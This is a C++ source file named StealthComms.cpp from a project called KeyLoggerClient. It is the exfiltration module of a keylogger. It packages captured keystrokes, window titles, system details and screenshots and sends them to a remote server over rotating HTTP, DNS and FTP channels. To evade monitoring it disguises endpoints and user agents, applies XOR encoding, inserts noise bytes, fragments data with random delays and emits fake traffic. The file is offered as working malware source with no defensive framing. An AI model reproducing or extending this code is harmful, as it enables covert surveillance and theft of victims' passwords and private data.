// KeyLoggerClient/src/security/StealthComms.cpp
#include "security/StealthComms.h"
#include "communication/HttpComms.h"
#include "communication/DnsComms.h"
#include "communication/FtpComms.h"
#include "core/Logger.h"
#include "core/Configuration.h"
#include "security/Obfuscation.h"
#include "utils/TimeUtils.h"
#include "utils/DataUtils.h"
#include "utils/StringUtils.h"
#include "utils/SystemUtils.h"
#include <windows.h>
#include <wininet.h>
#include <memory>
#include <random>
#include <algorithm>
#include <chrono>
#include <sstream>
#include <map>

#pragma comment(lib, "wininet.lib")

static const auto OBF_STEALTH_COMMS = OBFUSCATE("StealthComms");

// Method reliability tracking
static std::map<std::string, double> s_methodReliability = {
    {"http", 0.9},
    {"dns", 0.8}, 
    {"ftp", 0.7},
    {"icmp", 0.6},
    {"smtp", 0.5}
};

StealthComms::StealthComms(Configuration* config)
    : m_config(config), m_currentMethod("http") {
    
    m_serverUrl = config->GetServerUrl();
    m_clientId = utils::SystemUtils::GetSystemFingerprint();
    
    m_availableMethods = {"http", "dns", "ftp", "icmp", "smtp"};
}

StealthComms::~StealthComms() {
    Cleanup();
}

bool StealthComms::Initialize() {
    // Initialize all communication methods
    try {
        m_httpComms = std::make_unique<HttpComms>(m_config);
        m_dnsComms = std::make_unique<DnsComms>(m_config);
        m_ftpComms = std::make_unique<FtpComms>(m_config);
        
        // Test each method and update availability
        if (m_httpComms->Initialize()) {
            LOG_INFO("HTTP stealth method initialized");
        } else {
            LOG_WARN("HTTP stealth method failed to initialize");
        }
        
        if (m_dnsComms->Initialize()) {
            LOG_INFO("DNS stealth method initialized");
        } else {
            LOG_WARN("DNS stealth method failed to initialize");
        }
        
        if (m_ftpComms->Initialize()) {
            LOG_INFO("FTP stealth method initialized");
        } else {
            LOG_WARN("FTP stealth method failed to initialize");
        }
        
        LOG_INFO("Stealth communication system initialized");
        return true;
        
    } catch (const std::exception& e) {
        LOG_ERROR("Failed to initialize stealth communications: " + std::string(e.what()));
        return false;
    }
}

bool StealthComms::SendData(const std::vector<uint8_t>& data) {
    // Apply stealth encoding first
    std::vector<uint8_t> encodedData = ApplyStealthEncoding(data);
    
    // Add noise bytes for obfuscation
    encodedData = AddNoiseBytes(encodedData);
    
    // Try multiple methods with fallback
    std::vector<std::string> methodsToTry = {
        SelectOptimalMethod(),
        "http", "dns", "ftp"
    };
    
    // Remove duplicates
    methodsToTry.erase(std::unique(methodsToTry.begin(), methodsToTry.end()), methodsToTry.end());
    
    for (const auto& method : methodsToTry) {
        if (!IsMethodAvailable(method)) continue;
        
        LOG_DEBUG("Attempting stealth transmission via " + method);
        
        bool success = false;
        if (method == "http") {
            success = SendViaHTTP(encodedData);
        } else if (method == "dns") {
            success = SendViaDNS(encodedData);
        } else if (method == "ftp") {
            success = SendViaFTP(encodedData);
        } else if (method == "icmp") {
            success = SendViaICMP(encodedData);
        } else if (method == "smtp") {
            success = SendViaSMTP(encodedData);
        }
        
        UpdateMethodReliability(method, success);
        
        if (success) {
            m_currentMethod = method;
            LOG_INFO("Stealth data transmission successful via " + method);
            
            // Send some fake traffic to confuse monitoring
            CreateFakeTraffic();
            return true;
        }
        
        // Add delay between attempts
        AddRandomDelay();
    }
    
    LOG_ERROR("All stealth transmission methods failed");
    return false;
}

bool StealthComms::SendKeyLogs(const std::vector<KeyLogEntry>& logs) {
    // Convert keylog entries to binary format
    std::ostringstream oss;
    oss << "KEYLOG_DATA_START\n";
    oss << "client_id:" << m_clientId << "\n";
    oss << "entry_count:" << logs.size() << "\n";
    
    for (const auto& log : logs) {
        oss << "ENTRY_START\n";
        oss << "timestamp:" << log.timestamp << "\n";
        oss << "window:" << log.windowTitle << "\n";
        oss << "keys:" << log.keyData << "\n";
        oss << "ENTRY_END\n";
    }
    oss << "KEYLOG_DATA_END\n";
    
    std::string dataStr = oss.str();
    std::vector<uint8_t> data(dataStr.begin(), dataStr.end());
    
    return SendFragmented(data);
}

bool StealthComms::SendSystemInfo(const SystemInfo& systemInfo) {
    std::ostringstream oss;
    oss << "SYSTEM_INFO_START\n";
    oss << "client_id:" << m_clientId << "\n";
    oss << "computer_name:" << systemInfo.computerName << "\n";
    oss << "user_name:" << systemInfo.userName << "\n";
    oss << "os_version:" << systemInfo.osVersion << "\n";
    oss << "memory_size:" << systemInfo.memorySize << "\n";
    oss << "processor_info:" << systemInfo.processorInfo << "\n";
    oss << "SYSTEM_INFO_END\n";
    
    std::string dataStr = oss.str();
    std::vector<uint8_t> data(dataStr.begin(), dataStr.end());
    
    return SendData(data);
}

bool StealthComms::SendScreenshot(const std::vector<uint8_t>& imageData) {
    // Encode image data as base64
    std::string base64Data = Base64Encode(imageData.data(), imageData.size());
    
    std::ostringstream oss;
    oss << "SCREENSHOT_START\n";
    oss << "client_id:" << m_clientId << "\n";
    oss << "data_size:" << imageData.size() << "\n";
    oss << "encoding:base64\n";
    oss << "data:" << base64Data << "\n";
    oss << "SCREENSHOT_END\n";
    
    std::string dataStr = oss.str();
    std::vector<uint8_t> data(dataStr.begin(), dataStr.end());
    
    return SendFragmented(data);
}

bool StealthComms::SendViaHTTP(const std::vector<uint8_t>& data) {
    if (!m_httpComms) return false;
    
    // Use legitimate-looking endpoints
    std::vector<std::string> endpoints = {
        "/api/upload", "/data/sync", "/files/backup", 
        "/content/update", "/logs/analytics"
    };
    
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, endpoints.size() - 1);
    std::string endpoint = endpoints[dist(gen)];
    
    return SendHttpRequest(endpoint, data);
}

bool StealthComms::SendViaDNS(const std::vector<uint8_t>& data) {
    if (!m_dnsComms) return false;
    
    // Fragment data for DNS transmission
    std::vector<uint8_t> fragmentedData = FragmentData(data);
    return m_dnsComms->SendData(fragmentedData);
}

bool StealthComms::SendViaFTP(const std::vector<uint8_t>& data) {
    if (!m_ftpComms) return false;
    return m_ftpComms->SendData(data);
}

bool StealthComms::SendViaICMP(const std::vector<uint8_t>& data) {
    // ICMP implementation would go here
    // For now, fallback to HTTP
    LOG_DEBUG("ICMP not implemented, falling back to HTTP");
    return SendViaHTTP(data);
}

bool StealthComms::SendViaSMTP(const std::vector<uint8_t>& data) {
    // SMTP implementation would go here
    // For now, fallback to HTTP
    LOG_DEBUG("SMTP not implemented, falling back to HTTP");
    return SendViaHTTP(data);
}

bool StealthComms::SendFragmented(const std::vector<uint8_t>& data) {
    // Fragment data into smaller chunks with random sizes
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> sizeDist(256, 1024);
    
    std::vector<std::vector<uint8_t>> fragments;
    size_t offset = 0;
    
    while (offset < data.size()) {
        size_t fragmentSize = std::min(static_cast<size_t>(sizeDist(gen)), data.size() - offset);
        fragments.emplace_back(data.begin() + offset, data.begin() + offset + fragmentSize);
        offset += fragmentSize;
    }
    
    // Send fragments using different methods
    bool overallSuccess = true;
    for (size_t i = 0; i < fragments.size(); ++i) {
        // Add fragment metadata
        std::string header = "FRAG:" + std::to_string(i) + ":" + std::to_string(fragments.size()) + ":";
        std::vector<uint8_t> fragmentWithHeader(header.begin(), header.end());
        fragmentWithHeader.insert(fragmentWithHeader.end(), fragments[i].begin(), fragments[i].end());
        
        // Rotate methods for each fragment
        if (ShouldUseAlternateMethod()) {
            RotateMethod();
        }
        
        if (!SendData(fragmentWithHeader)) {
            LOG_WARN("Fragment " + std::to_string(i) + " transmission failed");
            overallSuccess = false;
        }
        
        // Random delay between fragments
        AddRandomDelay();
    }
    
    return overallSuccess;
}

std::vector<uint8_t> StealthComms::ApplyStealthEncoding(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> encoded = data;
    
    // Multi-layer encoding
    
    // Layer 1: Time-based XOR
    auto now = std::chrono::system_clock::now();
    auto timestamp = std::chrono::duration_cast<std::chrono::seconds>(now.time_since_epoch()).count();
    uint8_t timeKey = static_cast<uint8_t>(timestamp & 0xFF);
    
    for (size_t i = 0; i < encoded.size(); ++i) {
        encoded[i] ^= (timeKey + i) & 0xFF;
    }
    
    // Layer 2: Add stealth header
    std::string stealthHeader = "STEALTH_V2:" + std::to_string(timestamp) + ":";
    encoded.insert(encoded.begin(), stealthHeader.begin(), stealthHeader.end());
    
    // Layer 3: Reverse every 8 bytes
    for (size_t i = 0; i < encoded.size(); i += 8) {
        size_t endPos = std::min(i + 8, encoded.size());
        std::reverse(encoded.begin() + i, encoded.begin() + endPos);
    }
    
    return encoded;
}

std::vector<uint8_t> StealthComms::AddNoiseBytes(const std::vector<uint8_t>& data) {
    std::vector<uint8_t> noisy = data;
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> noiseDist(0, 255);
    std::uniform_int_distribution<> posDist(0, noisy.size());
    
    // Add 5-15% noise
    size_t noiseCount = (noisy.size() * (5 + (rd() % 10))) / 100;
    
    for (size_t i = 0; i < noiseCount; ++i) {
        size_t pos = posDist(gen) % noisy.size();
        noisy.insert(noisy.begin() + pos, static_cast<uint8_t>(noiseDist(gen)));
    }
    
    return noisy;
}

std::vector<uint8_t> StealthComms::CreateFakeTraffic() {
    // Generate fake traffic to confuse monitoring
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> sizeDist(100, 500);
    std::uniform_int_distribution<> dataDist(0, 255);
    
    size_t fakeSize = sizeDist(gen);
    std::vector<uint8_t> fakeData(fakeSize);
    
    for (auto& byte : fakeData) {
        byte = static_cast<uint8_t>(dataDist(gen));
    }
    
    // Send fake traffic via a random method
    std::uniform_int_distribution<> methodDist(0, m_availableMethods.size() - 1);
    std::string fakeMethod = m_availableMethods[methodDist(gen)];
    
    // Don't wait for response on fake traffic
    if (fakeMethod == "http") {
        SendViaHTTP(fakeData);
    }
    
    return fakeData;
}

std::string StealthComms::SelectOptimalMethod() {
    // Select method based on reliability scores
    std::string bestMethod = "http";
    double bestScore = 0.0;
    
    for (const auto& [method, score] : s_methodReliability) {
        if (score > bestScore && IsMethodAvailable(method)) {
            bestMethod = method;
            bestScore = score;
        }
    }
    
    return bestMethod;
}

bool StealthComms::IsMethodAvailable(const std::string& method) {
    if (method == "http") return m_httpComms != nullptr;
    if (method == "dns") return m_dnsComms != nullptr;
    if (method == "ftp") return m_ftpComms != nullptr;
    return true; // ICMP and SMTP always "available" (fallback to HTTP)
}

void StealthComms::UpdateMethodReliability(const std::string& method, bool success) {
    if (s_methodReliability.find(method) != s_methodReliability.end()) {
        if (success) {
            s_methodReliability[method] = std::min(1.0, s_methodReliability[method] + 0.05);
        } else {
            s_methodReliability[method] = std::max(0.1, s_methodReliability[method] - 0.1);
        }
    }
}

void StealthComms::RotateMethod() {
    auto it = std::find(m_availableMethods.begin(), m_availableMethods.end(), m_currentMethod);
    if (it != m_availableMethods.end()) {
        ++it;
        if (it == m_availableMethods.end()) {
            it = m_availableMethods.begin();
        }
        m_currentMethod = *it;
    }
}

bool StealthComms::ShouldUseAlternateMethod() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, 100);
    
    // 25% chance to use alternate method
    return dist(gen) < 25;
}

void StealthComms::AddRandomDelay() {
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> delayDist(200, 3000);
    
    int delayMs = delayDist(gen);
    utils::TimeUtils::JitterSleep(delayMs, 0.3);
}

bool StealthComms::SendHttpRequest(const std::string& endpoint, const std::vector<uint8_t>& data) {
    HINTERNET hSession = CreateHttpSession();
    if (!hSession) return false;
    
    bool success = SendSecureHttpRequest(hSession, endpoint, data);
    
    InternetCloseHandle(hSession);
    return success;
}

HINTERNET StealthComms::CreateHttpSession() {
    std::string userAgent = GenerateRandomUserAgent();
    
    return InternetOpenA(
        userAgent.c_str(),
        INTERNET_OPEN_TYPE_DIRECT,
        NULL,
        NULL,
        0
    );
}

bool StealthComms::SendSecureHttpRequest(HINTERNET hSession, const std::string& endpoint, 
                                       const std::vector<uint8_t>& data) {
    // Parse server URL
    std::string host, path;
    size_t pos = m_serverUrl.find("://");
    if (pos != std::string::npos) {
        std::string urlPart = m_serverUrl.substr(pos + 3);
        pos = urlPart.find('/');
        if (pos != std::string::npos) {
            host = urlPart.substr(0, pos);
            path = urlPart.substr(pos);
        } else {
            host = urlPart;
            path = "/";
        }
    }
    
    HINTERNET hConnect = InternetConnectA(
        hSession,
        host.c_str(),
        INTERNET_DEFAULT_HTTPS_PORT,
        NULL, NULL,
        INTERNET_SERVICE_HTTP,
        0, 0
    );
    
    if (!hConnect) return false;
    
    std::string fullPath = path + endpoint;
    HINTERNET hRequest = HttpOpenRequestA(
        hConnect,
        "POST",
        fullPath.c_str(),
        NULL, NULL, NULL,
        INTERNET_FLAG_SECURE,
        0
    );
    
    if (!hRequest) {
        InternetCloseHandle(hConnect);
        return false;
    }
    
    // Add legitimate headers
    std::string headers = "Content-Type: application/octet-stream\r\n";
    headers += "Accept: */*\r\n";
    headers += "Accept-Language: en-US,en;q=0.9\r\n";
    
    bool success = HttpSendRequestA(
        hRequest,
        headers.c_str(),
        headers.length(),
        (LPVOID)data.data(),
        data.size()
    );
    
    InternetCloseHandle(hRequest);
    InternetCloseHandle(hConnect);
    
    return success;
}

std::string StealthComms::GenerateRandomUserAgent() const {
    std::vector<std::string> userAgents = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.59"
    };
    
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, userAgents.size() - 1);
    
    return userAgents[dist(gen)];
}

std::string StealthComms::GenerateLegitimateDomain() const {
    std::vector<std::string> domains = {
        "api.example.com", "cdn.example.com", "static.example.com",
        "upload.example.com", "sync.example.com", "backup.example.com"
    };
    
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> dist(0, domains.size() - 1);
    
    return domains[dist(gen)];
}

std::string StealthComms::Base64Encode(const uint8_t* data, size_t length) {
    const std::string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    std::string result;
    
    for (size_t i = 0; i < length; i += 3) {
        uint32_t val = 0;
        int padding = 0;
        
        for (int j = 0; j < 3; ++j) {
            val <<= 8;
            if (i + j < length) {
                val |= data[i + j];
            } else {
                padding++;
            }
        }
        
        for (int j = 3; j >= 0; --j) {
            if (j <= padding) {
                result += '=';
            } else {
                result += chars[(val >> (6 * j)) & 0x3F];
            }
        }
    }
    
    return result;
}

std::vector<uint8_t> StealthComms::Base64Decode(const std::string& encoded) {
    // Base64 decode implementation
    std::vector<uint8_t> result;
    // Implementation would go here
    return result;
}

std::vector<uint8_t> StealthComms::EncodeData(const std::vector<uint8_t>& data) {
    return ApplyStealthEncoding(data);
}

std::vector<uint8_t> StealthComms::DecodeData(const std::vector<uint8_t>& data) {
    // Reverse of ApplyStealthEncoding
    std::vector<uint8_t> decoded = data;
    
    // Implementation would reverse the encoding steps
    
    return decoded;
}

std::vector<uint8_t> StealthComms::FragmentData(const std::vector<uint8_t>& data) {
    // Simple fragmentation with headers
    std::string header = "FRAGMENTED_DATA:";
    std::vector<uint8_t> result(header.begin(), header.end());
    result.insert(result.end(), data.begin(), data.end());
    return result;
}

void StealthComms::Cleanup() {
    if (m_httpComms) {
        m_httpComms->Cleanup();
        m_httpComms.reset();
    }
    if (m_dnsComms) {
        m_dnsComms->Cleanup();
        m_dnsComms.reset();
    }
    if (m_ftpComms) {
        m_ftpComms->Cleanup();
        m_ftpComms.reset();
    }
    
    LOG_DEBUG("Stealth communication cleaned up");
}

bool StealthComms::TestConnection() const {
    // Test all available methods
    bool anyAvailable = false;
    
    if (m_httpComms && m_httpComms->TestConnection()) {
        anyAvailable = true;
    }
    if (m_dnsComms && m_dnsComms->TestConnection()) {
        anyAvailable = true;
    }
    if (m_ftpComms && m_ftpComms->TestConnection()) {
        anyAvailable = true;
    }
    
    return anyAvailable;
}

std::vector<uint8_t> StealthComms::ReceiveData() {
    // Try each method to receive data
    if (m_httpComms) {
        std::vector<uint8_t> data = m_httpComms->ReceiveData();
        if (!data.empty()) {
            return DecodeData(data);
        }
    }
    
    if (m_dnsComms) {
        std::vector<uint8_t> data = m_dnsComms->ReceiveData();
        if (!data.empty()) {
            return DecodeData(data);
        }
    }
    
    if (m_ftpComms) {
        std::vector<uint8_t> data = m_ftpComms->ReceiveData();
        if (!data.empty()) {
            return DecodeData(data);
        }
    }
    
    return std::vector<uint8_t>();
}